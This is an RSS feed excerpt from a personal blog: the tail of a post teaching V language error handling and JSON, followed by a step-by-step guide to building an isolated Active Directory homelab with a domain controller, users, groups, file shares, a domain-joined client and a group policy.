</span></span></code></pre></div><p>Above, <code>http.get</code> returns a <code>!http.Response</code>. <code>resp</code> is only in scope for the first <code>if</code> branch. <code>err</code> is only in scope for the <code>else</code> branch.</p>
<h3 id="custom-error-types">Custom error types</h3>
<p>V gives you the ability to define custom error types through the <code>IError</code> interface. The interface requires two methods: <code>msg() string</code> and <code>code() int</code>. Every type that implements these methods can be used as an error.</p>
<p>When defining a custom error type it is recommended to embed the builtin <code>Error</code> default implementation. This provides an empty default implementation for both required methods, so you only have to implement what you really need, and may provide additional utility functions in the future.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">PathError</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Error</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">path</span> <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> (<span style="color:#a6e22e">err</span> <span style="color:#a6e22e">PathError</span>) <span style="color:#a6e22e">msg</span>() <span style="color:#66d9ef">string</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Failed</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">open</span> <span style="color:#a6e22e">path</span>: <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">path</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">try_open</span>(<span style="color:#a6e22e">path</span> <span style="color:#66d9ef">string</span>) ! {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// V automatically casts this to IError</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">PathError</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">path</span>: <span style="color:#a6e22e">path</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">try_open</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tmp</span><span style="color:#960050;background-color:#1e0010">&#39;</span>) <span style="color:#a6e22e">or</span> { panic(<span style="color:#a6e22e">err</span>) }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="json">JSON</h3>
<p>JSON</p>
<p>Because of the ubiquitous nature of JSON, support for it is built directly into V.</p>
<p>V generates code for JSON encoding and decoding. No runtime reflection is used. This results in much better performance.</p>
<h4 id="decoding-json">Decoding JSON</h4>
<p>The <code>json.decode</code> function takes two arguments: the first is the type into which the JSON value should be decoded and the second is a string containing the JSON data.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">json</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Foo</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">x</span> <span style="color:#66d9ef">int</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">User</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Adding a [required] attribute will make decoding fail, if that</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// field is not present in the input.</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// If a field is not [required], but is missing, it will be assumed</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// to have its default value, like 0 for numbers, or &#39;&#39; for strings,</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// and decoding will not fail.</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">name</span> <span style="color:#66d9ef">string</span> <span style="color:#960050;background-color:#1e0010">@</span>[<span style="color:#a6e22e">required</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">age</span>  <span style="color:#66d9ef">int</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Use the `@[skip]` attribute to skip certain fields.</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// You can also use `@[json: &#39;-&#39;]`, and `@[sql: &#39;-&#39;]`, which will cause only</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// the `json` module to skip the field, or only the SQL orm to skip it.</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">foo</span> <span style="color:#a6e22e">Foo</span> <span style="color:#960050;background-color:#1e0010">@</span>[<span style="color:#a6e22e">skip</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// If the field name is different in JSON, it can be specified</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">last_name</span> <span style="color:#66d9ef">string</span> <span style="color:#960050;background-color:#1e0010">@</span>[<span style="color:#a6e22e">json</span>: <span style="color:#a6e22e">lastName</span>]
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">data</span> <span style="color:#f92672">:=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>{ <span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Frodo&#34;</span>, <span style="color:#e6db74">&#34;lastName&#34;</span>: <span style="color:#e6db74">&#34;Baggins&#34;</span>, <span style="color:#e6db74">&#34;age&#34;</span>: <span style="color:#ae81ff">25</span>, <span style="color:#e6db74">&#34;nullable&#34;</span>: <span style="color:#a6e22e">null</span> }<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">user</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">decode</span>(<span style="color:#a6e22e">User</span>, <span style="color:#a6e22e">data</span>) <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">eprintln</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Failed</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">decode</span> <span style="color:#a6e22e">json</span>, <span style="color:#66d9ef">error</span>: <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">err</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">name</span>)
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">last_name</span>)
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">age</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">// You can also decode JSON arrays:</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sfoos</span> <span style="color:#f92672">:=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>[{<span style="color:#e6db74">&#34;x&#34;</span>:<span style="color:#ae81ff">123</span>},{<span style="color:#e6db74">&#34;x&#34;</span>:<span style="color:#ae81ff">456</span>}]<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">foos</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">decode</span>([]<span style="color:#a6e22e">Foo</span>, <span style="color:#a6e22e">sfoos</span>)!
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">foos</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">x</span>)
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">foos</span>[<span style="color:#ae81ff">1</span>].<span style="color:#a6e22e">x</span>)
</span></span></code></pre></div><h4 id="encoding-json">Encoding JSON</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">json</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">User</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">name</span>  <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">score</span> <span style="color:#a6e22e">i64</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">int</span>{}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">user</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">User</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">name</span>:  <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Pierre</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">score</span>: <span style="color:#ae81ff">1024</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">data</span>[<span style="color:#e6db74">&#39;x&#39;</span>] = <span style="color:#ae81ff">42</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">data</span>[<span style="color:#e6db74">&#39;y&#39;</span>] = <span style="color:#ae81ff">360</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">encode</span>(<span style="color:#a6e22e">data</span>)) <span style="color:#75715e">// {&#34;x&#34;:42,&#34;y&#34;:360}</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">encode</span>(<span style="color:#a6e22e">user</span>)) <span style="color:#75715e">// {&#34;name&#34;:&#34;Pierre&#34;,&#34;score&#34;:1024}</span>
</span></span></code></pre></div><h2 id="post-post-analysis">Post <em>post</em> analysis</h2>
<p>Now that I&rsquo;ve followed through the introduction replacing the sections in &lsquo;Introduction to Go&rsquo; with that Vlang, the infancy of V has become visible to me as I discover many features and libraris of Go are missing. But I belive (at least for now, pray for me) that this would be an opportunity to learn more.</p>
<h2 id="meme-time">Meme time</h2>
<p>If you&rsquo;ve made this far, here&rsquo;s your gift:</p>
<p><img src="./black-hat-v.png" alt="black-hat-v"></p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>AD Homelab 101: Building an Active Directory &#43; XDR homelab in 101 steps</title>
      <link>https://ashtrace.github.io/posts/building_homelab/</link>
      <pubDate>Fri, 23 May 2025 13:40:31 +0530</pubDate>
      
      <guid>https://ashtrace.github.io/posts/building_homelab/</guid>
      <description><![CDATA[<p>Fresh off my CRTO exam I itched for a local AD lab to practice red-team stuff. GOAD with the ELK/Wazuh extension is (at the time of writing) the best choice (author’s personal views) for this but I seriously lacked a gigaton of RAM required for 5 (lab) + 1 (extension) VMs, so I went Thanos mode and declared - Fine! I’ll do it myself.</p>
<blockquote>
<p>PS: I’ve tried GOAD (v2) without the ELK/Wazuh stack. It’s a stellar lab that hits a lot of awesome topics. If you haven’t touched it yet, crawl out from under that rock and go check it out.</p>
</blockquote>
<h2 id="my-host-device-specifications">My host device specifications</h2>
<p>The machine I used to built this lab has</p>
<ul>
<li>An AMD Ryzen 5500U processor - 6 Physical (12 Logical) cores</li>
<li>32 gigs of RAM (which might’ve been huge for ancient times, but since the dawn of LLMs I feel smol and scared.)</li>
</ul>
<h2 id="domain-controller">Domain Controller</h2>
<h3 id="fetch-windows-server-image">Fetch Windows Server Image</h3>
<p>Download the Windows Server 2022 VHD file from <a href="https://www.microsoft.com/en-us/evalcenter/download-windows-server-2022">here</a>. Create a copy of the downloaded file.</p>
<h3 id="setup-a-vm">Setup a VM</h3>
<p>I used VirtualBox to create a new VM named LAB-DC and imported the downloaded VHD file. I provided the lab with Virtualbox Host-Only network connection, which can be created leveraging the <code>Tools &gt; Network</code> window.</p>
<p><img src="./virtualbox-network.png" alt="virtualbox-network"></p>
<p>Boot up the VM and follow the installation steps:</p>
<ol>
<li>Select the Locale settings.</li>
</ol>
<p><img src="./locale.png" alt="locale"></p>
<ol start="2">
<li>
<p>Accept the License agreement.</p>
</li>
<li>
<p>Create a password for the administrator account. I used <code>lab@1234$</code>.</p>
</li>
</ol>
<p><img src="./administrator-password.png" alt="administrator-password"></p>
<ol start="4">
<li>Click on Finish.</li>
</ol>
<h3 id="configure-vm-addons">Configure VM addons</h3>
<ol start="5">
<li>
<p>Log-in as administrator.</p>
</li>
<li>
<p>From the toolbar, select add &lsquo;Virtualbox Guest-Addons&rsquo;. Install it to improve the VMs execution.</p>
</li>
</ol>
<p><img src="./vbox-guest-addons-1.png" alt="vbox-guest-addons-1"></p>
<p><img src="./vbox-guest-addons-2.png" alt="vbox-guest-addons-2"></p>
<p>Follow along after the server VM restarts.</p>
<h3 id="set-the-server-hostname">Set the server hostname</h3>
<ol start="7">
<li>In the server manager application window, navigate to <code>Local Server</code> from the left pane. Click on <code>Computer Name</code> under <code>Properties</code>. Further, click on the <code>Change</code> button to change server name.</li>
</ol>
<p><img src="./server-name-1.png" alt="server-name-1"></p>
<p><img src="./server-name-2.png" alt="server-name-2"></p>
<p>Click on <code>OK</code> and restart the VM.</p>
<h3 id="configure-the-static-ip-address">Configure the static IP address</h3>
<ol start="8">
<li>Hit <code>Win+R</code> and run <code>ncpa.cpl</code> to open Network Connections under Control Panel. View the property of the ethernet interface.</li>
</ol>
<p><img src="./static-ip-ethernet-properties.png" alt="static-ip-ethernet-properties"></p>
<ol start="9">
<li>Click on <code>Internet Protocol Version 4 (TCP/IPv4)</code> and select its properties. Set the preferred IP Address and set the gateway to Host&rsquo;s IP Address. Set the preferred DNS same as the IP Address of the server. Finally, click on <code>OK</code>.</li>
</ol>
<p><img src="./static-ip-ipv4-properties.png" alt="static-ip-ipv4-properties"></p>
<h2 id="install-active-directory-domain-services">Install Active Directory Domain Services</h2>
<ol start="10">
<li>Launch <code>Server Manager</code>. Navigate to <code>Manage &gt; Add Roles and Features</code>. Continue with default installation.</li>
</ol>
<p><img src="./server-manager-manage-add-roles-and-features.png" alt="server-manager-manage-add-roles-and-features"></p>
<p><img src="./add-roles-and-featuers-begin.png" alt="add-roles-and-featuers-begin"></p>
<ol start="11">
<li>Continue Clicking on next until <code>Select Server roles</code>. Select <code>Active Directory Domain Services</code> and click on <code>Add Features</code> in the window that pops-up.</li>
</ol>
<p><img src="./add-roles-and-featuers-select-server-roles.png" alt="add-roles-and-featuers-select-server-roles"></p>
<p>Ensuring that <code>Active Directory Doman Services</code> is selected, click on <code>Next</code>.</p>
<ol start="12">
<li>
<p>Go forward with default selection in <code>Features</code> and <code>AD DS</code> tab by clicking on <code>Next</code>.</p>
</li>
<li>
<p>On the <code>Confirmation</code> tab, select the <code>Restart the destination server automatically if required</code> if required and click on <code>Install</code>.</p>
</li>
</ol>
<p><img src="./add-roles-and-features-confirmation.png" alt="add-roles-and-features-confirmation"></p>
<ol start="14">
<li>Once greeted with following screen, click on the flag icon.</li>
</ol>
<p><img src="./add-roles-and-features-install-completed.png" alt="add-roles-and-features-install-completed"></p>
<p>Under Post-deployment configuration section, click on <code>Promote this server to a domain controller</code>.\</p>
<p><img src="./post-deployment-configuration-section.png" alt="post-deployment-configuration-section"></p>
<ol start="15">
<li>Create a new forest and set the appropriate name.</li>
</ol>
<p><img src="./post-deployment-create-forest.png" alt="post-deployment-create-forest"></p>
<p>Click on next.</p>
<ol start="16">
<li>Let the forest functional level and domain functional level be at default of <code>Windows Server 2016</code>.</li>
</ol>
<p><img src="./post-deployment-functional-level.png" alt="post-deployment-functional-level"></p>
<ol start="17">
<li>Keep the default roles for the DC. Set the DSRM password. I used <code>labdsrm@1234$</code></li>
</ol>
<p><img src="./post-deployment-dsrm.png" alt="post-deployment-dsrm"></p>
<ol start="18">
<li>In the <code>DNS Options</code> menu, just click <code>Next</code>.</li>
</ol>
<p><img src="./post-deployment-dns.png" alt="post-deployment-dns"></p>
<ol start="19">
<li>
<p>Follow through and click <code>Next</code> on verify the NetBIOS domain name.</p>
</li>
<li>
<p>Under the <code>Paths</code> configuration window go with default settings if no changes are needed.</p>
</li>
</ol>
<p><img src="./post-deployment-paths.png" alt="post-deployment-paths"></p>
<ol start="21">
<li>
<p>Click on <code>Next</code> under <code>Review Options</code> window.</p>
</li>
<li>
<p>After <code>Prerequisite Checks</code> pass, click on <code>Install</code> to continue.</p>
</li>
</ol>
<p><img src="./post-deployment-prerequisite-checks.png" alt="post-deployment-prerequisite-checks"></p>
<ol start="23">
<li>Let the server restart.</li>
</ol>
<p><img src="./post-deployment-installation-complete.png" alt="post-deployment-installation-complete"></p>
<ol start="24">
<li>Once the server restarts, log in as <code>&lt;DOMAIN&gt;\Administrator</code> using the password of administrator we setup above while installing the VM (here: <code>lab@1234$</code>).</li>
</ol>
<h2 id="creating-domain-objects">Creating Domain Objects</h2>
<h3 id="creating-organizational-units-ous">Creating Organizational Units (OUs)</h3>
<blockquote>
<p><strong>NOTE:</strong> One may skip this and directly add users.</p>
</blockquote>
<ol start="25">
<li>Launch Server Manager and navigate to <code>Tools &gt; Active Directory Users and Computers</code></li>
</ol>
<p><img src="./ad-users-and-computers.png" alt="ad-users-and-computers"></p>
<ol start="26">
<li>Right-click on the <code>&lt;DOMAIN NAME&gt;</code> (here and hereafter <code>LAB.LOCAL</code> for us), select <code>New</code> and click on <code>Organizational Unit</code>.</li>
</ol>
<p><img src="./ad-new-ou.png" alt="ad-new-ou"></p>
<p>In the dialog bog, provide with an OU name of your choice and click on <code>OK</code>.</p>
<p><img src="./ad-new-ou-lab-ou.png" alt="ad-new-ou-lab-ou"></p>
<p>We can create nested OUs by:</p>
<ul>
<li>Right-click on the OU of choice, navigate to <code>New &gt; Organizational Unit</code> and follow the process as above.</li>
</ul>
<p>I created two more OUs under our <code>LAB-OU</code> namely, <code>Users</code> and <code>Computers</code>, within <code>Users</code> I further created two OUs - <code>Administrators</code> and <code>Researchers</code>. (It made for a good practice)</p>
<p><img src="./nested-ous.png" alt="nested-ous"></p>
<h3 id="creating-a-user">Creating a User</h3>
<ol start="27">
<li>
<p>Right-click the <code>Administrators</code> OU under <code>LAB-OU &gt; Users</code>, navigate to <code>New &gt; User</code>.</p>
</li>
<li>
<p>Fill in the name details. Click on <code>Next</code>.</p>
</li>
</ol>
<p><img src="./add-user-name.png" alt="add-user-name"></p>
<ol start="29">
<li>Set the password details and select any other configuration required (here: <code>admin@1234</code>). Click on <code>Next</code>.</li>
</ol>
<p><img src="./add-user-passwd.png" alt="add-user-passwd"></p>
<ol start="30">
<li>Click on <code>Finish</code>.</li>
</ol>
<blockquote>
<p>Practise by creating multiple users.</p>
</blockquote>
<h3 id="promoting-a-user-to-domain-administrator">Promoting a user to Domain Administrator</h3>
<ol start="31">
<li>Right-click on the newly created user and navigate to <code>Properties</code>.</li>
</ol>
<p><img src="./user-properties.png" alt="user-properties"></p>
<ol start="32">
<li>Navigate to <code>Member Of</code> Tab. The screen should display the groups this particular user is part of.
Click on <code>Add...</code>.</li>
</ol>
<p><img src="./user-member-of.png" alt="user-member-of"></p>
<ol start="33">
<li>In the <code>Select Groups</code> window, within the form-field labeled <strong>Enter the object names to select (examples)</strong>, enter <code>domain</code> and Click on <code>OK</code>.</li>
</ol>
<p><img src="./select-da-group-1.png" alt="select-da-group-1"></p>
<p>A dialog box with all group names starting with <code>Domain</code> should appear, select the <code>Domain Admins</code> group and click on <code>OK</code>.</p>
<p><img src="./select-da-group-2.png" alt="select-da-group-2"></p>
<p>Click on <code>Apply</code>, then click on <code>OK</code>.</p>
<h3 id="creating-a-group">Creating a Group</h3>
<ol start="34">
<li>Navigate to the OU of your choice, right-click and select <code>New &gt; Group</code>. Add details and click on <code>OK</code>.</li>
</ol>
<p><img src="./add-group.png" alt="add-group"></p>
<h3 id="add-group-members">Add Group Members</h3>
<ol start="35">
<li>Right-click on the newly created group and select <code>Properties</code>. Open the <code>Members</code> Tab, click on <code>Add...</code>.</li>
</ol>
<p><img src="./group-members-1.png" alt="group-members-1"></p>
<ol start="36">
<li>A <code>Select Users, Contacts, Computers, Service Accounts, or Groups</code> window opens up. Within the form field under <strong>Enter the objct names to select (examples)</strong> enter the name of target user (click on <code>Check Names</code> to correct the format). Finally, click on <code>OK</code>.</li>
</ol>
<p><img src="./group-members-add-user.png" alt="group-members-add-user"></p>
<p>Click on <code>Apply</code> and then click on <code>OK</code>.</p>
<blockquote>
<p>Group membership of user can be verified by navigating to user&rsquo;s <code>Properties &gt; Member Of</code>.</p>
</blockquote>
<h2 id="creating-a-file-share">Creating a File Share</h2>
<ol start="37">
<li>Create a new folder (here <code>test-share</code>).</li>
</ol>
<p><img src="./new-folder-test-share.png" alt="new-folder-test-share"></p>
<ol start="38">
<li>Navigate to <code>Properties &gt; Sharing</code> from the context-menu of the folder. Click on <code>Advanced Sharing</code>.</li>
</ol>
<p><img src="./test-share-sharing-tab.png" alt="test-share-sharing-tab"></p>
<ol start="39">
<li>Enable <code>Share this folder</code>. Configure <code>Share name</code> if needed, click on <code>Apply</code> and click on <code>OK</code>.</li>
</ol>
<p><img src="./test-share-advanced-sharing.png" alt="test-share-advanced-sharing"></p>
<ol start="40">
<li>Visit the DC and the file-share would be visible.</li>
</ol>
<p><img src="./run-lab-dc.png" alt="run-lab-dc"></p>
<p><img src="./lab-dc-files-shares.png" alt="lab-dc-files-shares"></p>
<h3 id="configure-file-share-permissions">Configure file-share permissions</h3>
<ol start="41">
<li>Navigate to <code>Properties &gt; Security</code> Tab from context-menu of the folder/file share.</li>
</ol>
<p><img src="./test-share-security-tab.png" alt="test-share-security-tab"></p>
<ol start="42">
<li>Click on <code>Edit</code>. Next, click on <code>Add...</code></li>
</ol>
<p><img src="./permissions-for-test-share.png" alt="permissions-for-test-share"></p>
<ol start="43">
<li>In the <code>Select Users, Computers, Service Accounts, Grups</code> window, search and select the entities. Click on <code>OK</code>.</li>
</ol>
<p><img src="./test-share-select-user.png" alt="test-share-select-user"></p>
<ol start="44">
<li>Change the Permissions for the entity from the <code>Allow</code>/<code>Deny</code> list. Finally, Click on <code>Apply</code> and <code>OK</code> respectively.</li>
</ol>
<p><img src="./test-share-user-permissions.png" alt="test-share-user-permissions"></p>
<h2 id="adding-a-computer-to-the-ad-domain">Adding a computer to the AD Domain</h2>
<p>A long time ago in a galaxy far, far away Microsoft offered Windows VM images to test Internet-Explorer. The files have since been archived across internet. One may grab the version that suits them <a href="https://archive.org/download/modern.ie-vm">here</a> all other places of their choice. I am using virtualbox, so it would be a virtualbox image in my case.</p>
<ol start="45">
<li>Download the archive, extract it and import the (here <code>.ova</code>) file in virtualbox (<code>Ctrl+I</code> for importing an image).</li>
</ol>
<p><img src="./ova-file.png" alt="ova-file"></p>
<p><img src="./ova-import.png" alt="ova-import"></p>
<blockquote>
<p>Configure the network adapter of new machine to connect to Virtualbox host-only adapter (same as the DC).</p>
</blockquote>
<ol start="46">
<li>Log into the VM (<code>IEUser:Passw0rd!</code>). Run (<code>Win+R</code>) <code>ncpa.cpl</code> to enter <code>Network Connections</code> window in <code>Control Panel &gt; Network and Interent</code>. Configure the DNS server to DC IP for the Ethernet interface by navigating through <code>Properties</code> (as above).</li>
</ol>
<p>Although the Virtualbox host-only adapter would provide this VM with a range in same subnet as DC through DHCP, I will configure a static IP for this machine (for identification purposes in my later projects).</p>
<p><img src="./machine-network.png" alt="machine-network"></p>
<ol start="47">
<li>Launch <code>Settings</code> and go to <code>Accounts &gt; Access work or school</code>. Click on <code>Connect</code>.</li>
</ol>
<p><img src="./settings-add-account.png" alt="settings-add-account"></p>
<ol start="48">
<li>Click on <code>Join this device to a local Active Directory domain</code>.</li>
</ol>
<p><img src="./join-to-local-ad.png" alt="join-to-local-ad"></p>
<ol start="49">
<li>Enter the domain name in the <code>Join a domain</code> window. Click on <code>Next</code>.</li>
</ol>
<p><img src="./join-a-domain.png" alt="join-a-domain"></p>
<ol start="50">
<li>Enter the username and password of a Domain Administrator account to authenticate.</li>
</ol>
<p><img src="./login-in-ad.png" alt="login-in-ad"></p>
<ol start="51">
<li>Click on <code>Skip</code>.</li>
</ol>
<p><img src="./skip-rest.png" alt="skip-rest"></p>
<p>Restart the VM.</p>
<ol start="52">
<li>Login using one of the user accounts created earlier.</li>
</ol>
<p><img src="./user-login-ad.png" alt="user-login-ad"></p>
<ol start="53">
<li>Go to <code>Control Panel &gt; Network and Interent &gt; Network and Sharing Center</code> to validate you are connected to the domain.</li>
</ol>
<p><img src="./network-and-sharing-center.png" alt="network-and-sharing-center"></p>
<p>The reachability can be established from the command-prompt as follows:</p>
<p><img src="./cmd-domain-reachability.png" alt="cmd-domain-reachability"></p>
<blockquote>
<p>The computer would be visible in the <code>Computers</code> Section under the <code>Active Directory Users and Computers</code>. It can be <em>dragged-and-dropped</em> to any OU we created.</p>
</blockquote>
<p><img src="./domain-joined-computer.png" alt="domain-joined-computer"></p>
<h2 id="create-a-group-policy">Create a Group Policy</h2>
<ol start="54">
<li>Back on the DC machine, launch the <code>Server Manager</code> and go to <code>Tools &gt; Group Policy Management</code>.</li>
</ol>
<p><img src="./group-policy-management.png" alt="group-policy-management"></p>
<p>One can navigate through different Organizational Units (OUs), and select the one required.</p>
<p><img src="./gpm-ous.png" alt="gpm-ous"></p>
<h3 id="group-policy-to-create-a-local-administrator-account">Group policy to create a local administrator account</h3>
<ol start="55">
<li>Right click on the OU with computers, select <code>Create a GPO in this domain, and Link it here...</code></li>
</ol>
<p><img src="./create-a-gpo-and-link-it-here.png" alt="create-a-gpo-and-link-it-here"></p>
<ol start="56">
<li>Provide a name for the new Group Policy Object (GPO) and click on <code>OK</code>.</li>
</ol>
<p><img src="./new-gpo-name.png" alt="new-gpo-name"></p>
<ol start="57">
<li>Right-click on the newly created GPO and select <code>Edit</code>.</li>
</ol>
<p><img src="./edit-gpo.png" alt="edit-gpo"></p>
<ol start="58">
<li>A <code>Group Policy Management Editor</code> window pops-up. Go to <code>Preferences &gt; Control Panel Settings</code> and select <code>Local Users and Groups</code>. Right-click on the table (empty here), and select <code>New &gt; Local Group</code>.</li>
</ol>
<p><img src="./local-users-and-groups.png" alt="local-users-and-groups"></p>
<ol start="59">
<li>Within the <code>New Local Group Properties</code>, set the <code>Action</code> to be <code>Update</code>. Select the <code>Group name</code> to be <code>Administrators (built-in)</code> from the drop-down menu.</li>
</ol>
<p><img src="./groups-drop-down.png" alt="groups-drop-down"></p>
<ol start="60">
<li>Click on <code>Add</code> under <code>Members</code> table.</li>
</ol>
<p><img src="./add-groupmember.png" alt="add-groupmember"></p>
<ol start="61">
<li>Click on the <code>...</code> button beside name to spawn the <code>Select User, Computer, or Group</code> window.</li>
</ol>
<p><img src="./local-group-member-add-3-button.png" alt="local-group-member-add-3-button"></p>
<ol start="62">
<li>Enter the object name (here <code>ashtrace</code>, a domain-joned user I created earlier). Click on <code>Check Names</code> to retrieve the particular user name in correct format. Click on <code>OK</code>.</li>
</ol>
<p><img src="./select-user-ashtrace.png" alt="select-user-ashtrace"></p>
<p>Click on <code>OK</code> again (Notice that the user name is prefixed by the domain name.)</p>
<p><img src="./select-user-ashtrace-2.png" alt="select-user-ashtrace-2"></p>
<p>Finally, Click on <code>Apply</code> and <code>OK</code> respectively.</p>
<ol start="63">
<li>Validate the GPO by going back to <code>Group Policy Management</code> Window, navigate to the OU and select the GPO created. Visit the <code>Settings</code> tab.</li>
</ol>
<p><img src="./gpo-settings-page.png" alt="gpo-settings-page"></p>
<p>Titles can be expanded through clicks over them, and it can be observed that the GPO updates the membership of the built-in administrators group.</p>
<p><img src="./gpo-settings-page-2.png" alt="gpo-settings-page-2"></p>
<blockquote>
<p>A window-pop with alert from internet-explorer/edge might spawn complaining website trust issues as the setting page renders an HTML file. Go forth and trust the source, by selecting <code>Add</code> in the window itself, to render the contents.</p>
</blockquote>
<h3 id="syncing-group-policy-updates">Syncing group policy updates</h3>
<ol start="64">
<li>
<p>Go to the machine added earlier.</p>
</li>
<li>
<p>Either reboot it, or spawn a command prompt and type <code>gpupdate /force</code>.</p>
</li>
<li>
<p>Once update, open up file explorer. Right-click on <code>This PC</code> and select <code>Manage</code>.</p>
</li>
</ol>
<p><img src="./this-pc-manage.png" alt="this-pc-manage"></p>
<p>Within the <code>Computer Management</code> window, go to <code>Local Users and Groups</code>. Double-click on <code>Groups</code>, followed by a <code>double-click</code> on <code>Administrators</code>.</p>
<p><img src="./administrators-group-members.png" alt="administrators-group-members"></p>
<p>It is evident that <code>LAB\ashtrace</code> is a member of the builtin-administratosr group now, and their credential can be used to exeute task with administrative privileges.</p>
